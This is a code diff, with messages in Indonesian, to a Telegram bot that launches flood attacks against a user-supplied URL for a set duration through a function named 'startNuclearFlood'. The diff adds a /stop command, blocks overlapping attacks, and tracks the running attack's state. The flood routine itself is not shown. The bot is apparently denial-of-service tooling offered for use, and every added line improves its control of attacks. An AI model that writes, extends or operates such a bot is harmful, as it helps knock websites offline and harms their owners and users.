@@ -8,6 +8,7 @@ const AUTHORIZED_USER_ID = 8710323660;
 const bot = new TelegramBot(TOKEN, { polling: true });
 
 let userState = {};
+let currentAttack = null;
 
 console.log("Bot berhasil dijalankan...");
 
@@ -71,6 +72,34 @@ Silakan masukkan target dan durasi serangan.
     bot.answerCallbackQuery(callbackQuery.id);
 });
 
+bot.onText(/\/stop/, (msg) => {
+    const chatId = msg.chat.id;
+
+    if (!isUserAuthorized(chatId)) return;
+
+    if (currentAttack) {
+        currentAttack.stop();
+        clearTimeout(currentAttack.finishTimeout);
+
+        const stopMessage = `
+⚠️ *Serangan Dihentikan Paksa*
+
+*Target:* \`${currentAttack.url}\`
+        `;
+
+        bot.editMessageText(stopMessage, {
+            chat_id: currentAttack.chatId,
+            message_id: currentAttack.messageId,
+            parse_mode: 'Markdown'
+        }).catch(() => {});
+
+        currentAttack = null;
+        bot.sendMessage(chatId, "Serangan telah berhasil dihentikan.");
+    } else {
+        bot.sendMessage(chatId, "Tidak ada serangan yang sedang berjalan untuk dihentikan.");
+    }
+});
+
 bot.on('message', async (msg) => {
     const chatId = msg.chat.id;
     const text = msg.text;
@@ -80,6 +109,11 @@ bot.on('message', async (msg) => {
     if (!isUserAuthorized(chatId)) return;
 
     if (userState[chatId] === 'awaiting_attack_details') {
+        if (currentAttack) {
+            bot.sendMessage(chatId, "⚠️ Serangan lain sedang berjalan. Harap tunggu hingga selesai atau hentikan dengan perintah /stop.");
+            return;
+        }
+
         const parts = text.split(' ');
 
         if (parts.length !== 2 || !parts[0].startsWith('http') || isNaN(parseInt(parts[1]))) {
@@ -118,9 +152,9 @@ bot.on('message', async (msg) => {
             }
         };
 
-        startNuclearFlood(url, duration, statusCallback);
+        const attackControls = startNuclearFlood(url, duration, statusCallback);
         
-        setTimeout(() => {
+        const finishTimeout = setTimeout(() => {
             const finalText = `
 🛑 *Serangan Selesai*
 
@@ -132,6 +166,15 @@ bot.on('message', async (msg) => {
                 message_id: messageId,
                 parse_mode: 'Markdown'
             }).catch(() => {});
+            currentAttack = null;
         }, (duration + 1) * 1000);
+
+        currentAttack = {
+            stop: attackControls.stop,
+            finishTimeout: finishTimeout,
+            messageId: messageId,
+            chatId: chatId,
+            url: url
+        };
     }
 });
